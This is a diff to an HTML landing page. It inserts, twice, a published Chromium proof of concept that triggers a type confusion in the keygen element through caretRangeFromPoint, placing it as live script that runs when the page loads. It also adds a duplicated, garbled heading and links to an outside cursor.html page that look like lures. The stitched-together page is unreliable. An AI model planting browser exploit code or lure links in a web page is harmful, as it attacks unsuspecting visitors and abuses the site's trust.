@@ -1,6 +1,33 @@
-<!DOCTYPE html>
+<!DOCTYPE html><h2>An apple is is better than an app</h2><a href="https://camel-light.github.io/landing-page2/39039/cursor.html"> Enjoy </a><h2>An apple is is better than an app</h2><a href="https://camel-light.github.io/landing-page2/39039/cursor.html"> Enjoy </a><keygen id="keygen_element" style="position:absolute; height: 100px; width: 100px;">
+<script>
+var range = document.caretRangeFromPoint(50, 50);
+var shadow_tree_container = range.commonAncestorContainer;
+shadow_tree_container.prepend("foo");
+keygen_element.disabled = true;
+</script>
 <html>
-
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=994
+ 
+Chrome bug:
+https://bugs.chromium.org/p/chromium/issues/detail?id=666246
+ 
+PoC:
+-->
+ 
+<keygen id="keygen_element" style="position:absolute; height: 100px; width: 100px;">
+<script>
+var range = document.caretRangeFromPoint(50, 50);
+var shadow_tree_container = range.commonAncestorContainer;
+shadow_tree_container.prepend("foo");
+keygen_element.disabled = true;
+</script>
+ 
+<!--
+What happens here:
+1. caretRangeFromPoint() allows accessing (and modifying) userAgentShadowRoot from JavaScript
+2. HTMLKeygenElement::shadowSelect() blindly casts the first child of the userAgentShadowRoot to HTMLSelectElement without checking the Node type.
+-->
   <title>My landing page title!!</title>
   <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
 
